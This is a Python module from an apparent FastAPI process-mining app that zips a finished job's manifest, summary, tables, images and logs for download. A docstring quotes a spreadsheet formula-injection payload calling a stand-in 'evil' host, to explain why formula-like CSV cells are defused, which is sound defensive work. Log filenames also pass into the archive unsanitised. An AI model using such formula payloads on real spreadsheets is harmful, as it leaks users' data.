"""Logic to zip and export completed job run artifacts."""

from __future__ import annotations

import io
import json
import platform
import zipfile
import base64
from datetime import datetime, timezone
from typing import Any
from fastapi import HTTPException
from fastapi.responses import StreamingResponse

import jobs_db
from config import APP_NAME, validate_job_id


#: Leading characters that make a spreadsheet treat a cell as a formula rather than as text.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def csv_cell(value: Any) -> str:
    """One CSV cell: quoted where the format needs it, defused where a spreadsheet would run it.

    Table cells can contain names from uploaded logs, so a cell like
    ``=HYPERLINK("http://evil/"&A1,"click")`` would be evaluated by Excel or LibreOffice.
    Such cells get a leading apostrophe. Numbers such as ``-5`` are left alone.
    """
    if value is None:
        return ""
    text = str(value)

    if text.startswith(_FORMULA_LEAD) and not _is_number(text):
        text = "'" + text

    if any(c in text for c in (",", '"', "\n", "\r")):
        text = '"' + text.replace('"', '""') + '"'
    return text


def _is_number(text: str) -> bool:
    try:
        float(text)
    except (TypeError, ValueError):
        return False
    return True


def _isoformat(epoch: float | None) -> str | None:
    if not epoch:
        return None
    return datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat()


def _read_pm4py_version() -> str | None:
    try:
        import pm4py  # type: ignore
        return getattr(pm4py, "__version__", None)
    except Exception:
        return None


def _build_manifest(job: dict[str, Any]) -> dict[str, Any]:
    """Compact metadata blob that ships alongside the artifacts so a user
    can answer 'what version was this run, and with which parameters?'
    weeks later without grepping the codebase.

    Intentionally lightweight — no embedded log bytes, no executable code.
    Filename SHA / log size aren't recorded because the raw input log is
    no longer on disk by the time the export runs.
    """
    started_at = job.get("started_at")
    finished_at = job.get("finished_at")
    duration = None
    if started_at and finished_at:
        duration = round(finished_at - started_at, 3)

    return {
        "schema_version": 1,
        "job_id": job.get("id"),
        "status": job.get("status"),
        "algorithm": {
            "id": job.get("algorithm_id"),
            "name": job.get("algorithm_name"),
        },
        "parameters": job.get("params") or {},
        "input_log": {
            "filename": job.get("filename"),
        },
        "environment": {
            "python_version": platform.python_version(),
            "pm4py_version": _read_pm4py_version(),
            "platform": f"{platform.system()} {platform.release()}",
        },
        "timestamps": {
            "created_at": _isoformat(job.get("created_at")),
            "started_at": _isoformat(started_at),
            "finished_at": _isoformat(finished_at),
            "duration_seconds": duration,
        },
        "note": (
            f"Written by {APP_NAME}. Use this to identify the exact "
            "algorithm version and parameter set that produced the artifacts "
            "in this archive."
        ),
    }


async def download_job_artifacts(job_id: str) -> StreamingResponse:
    """Read job results and compile all artifacts into a downloadable ZIP archive."""
    validate_job_id(job_id)
    
    job = await jobs_db.read_job(job_id)
    if not job or "result" not in job or not job["result"]:
        raise HTTPException(status_code=404, detail="Job results not found or job is still running.")
        
    result = job["result"]
    artifacts = result.get("artifacts", [])
    
    # Create in-memory zip
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
        # Run manifest — lightweight reproducibility metadata.
        try:
            manifest = _build_manifest(job)
            zip_file.writestr("manifest.json", json.dumps(manifest, indent=2, default=str))
        except Exception:
            # Never block the download on a manifest hiccup.
            pass

        # Add summary and stats to summary.txt
        summary_lines = []
        if result.get("summary"):
            summary_lines.append(result["summary"])
            summary_lines.append("")
            
        stats = [art for art in artifacts if art.get("kind") == "stat"]
        if stats:
            summary_lines.append("--- STATISTICS ---")
            for s in stats:
                label = s.get("label", "")
                val = s.get("value")
                unit = s.get("unit") or ""
                if s.get("pct") and isinstance(val, (int, float)):
                    val_str = f"{val * 100:.1f}%"
                elif isinstance(val, float):
                    val_str = f"{val:.3f}"
                else:
                    val_str = str(val)
                val_with_unit = f"{val_str} {unit}".strip()
                summary_lines.append(f"{label}: {val_with_unit}")
            summary_lines.append("")
            
        if summary_lines:
            zip_file.writestr("summary.txt", "\n".join(summary_lines))
            
        # Add artifacts
        for i, art in enumerate(artifacts):
            kind = art.get("kind")
            label = art.get("label", f"artifact_{i}")
            safe_label = "".join([c for c in label if c.isalnum() or c in (" ", "_", "-")]).strip().replace(" ", "_")
            
            if kind == "stat":
                # Stats are already written to summary.txt
                continue
            elif kind == "text":
                zip_file.writestr(f"text/{safe_label}.md", art.get("markdown", ""))
            elif kind == "table":
                cols = art.get("columns", [])
                rows = art.get("rows", [])
                csv_buffer = io.StringIO()
                # Column names go through the same escaping as the cells — they come from
                # algorithm output and are no more trustworthy than the rows below them.
                csv_buffer.write(",".join(csv_cell(c) for c in cols) + "\n")
                for row in rows:
                    csv_buffer.write(",".join(csv_cell(cell) for cell in row) + "\n")
                zip_file.writestr(f"tables/{safe_label}.csv", csv_buffer.getvalue())
            elif kind == "image":
                data_b64 = art.get("data_base64", "")
                mime = art.get("mime", "image/png")
                ext = mime.split("/")[-1] if "/" in mime else "png"
                if ";" in ext:
                    ext = ext.split(";")[0]
                img_data = base64.b64decode(data_b64)
                zip_file.writestr(f"images/{safe_label}.{ext}", img_data)
            elif kind == "log":
                data_b64 = art.get("data_base64", "")
                filename = art.get("filename", f"log_{i}.xes")
                log_data = base64.b64decode(data_b64)
                zip_file.writestr(f"logs/{filename}", log_data)
                
    zip_buffer.seek(0)
    
    # Get a nice filename for the zip file
    algo_name = job.get("algorithm_name", "analysis").split(" — ")[0].strip().replace(" ", "_")
    filename = f"run_{job_id[:8]}_{algo_name}_results.zip"
    
    return StreamingResponse(
        zip_buffer,
        media_type="application/zip",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Access-Control-Expose-Headers": "Content-Disposition"
        }
    )
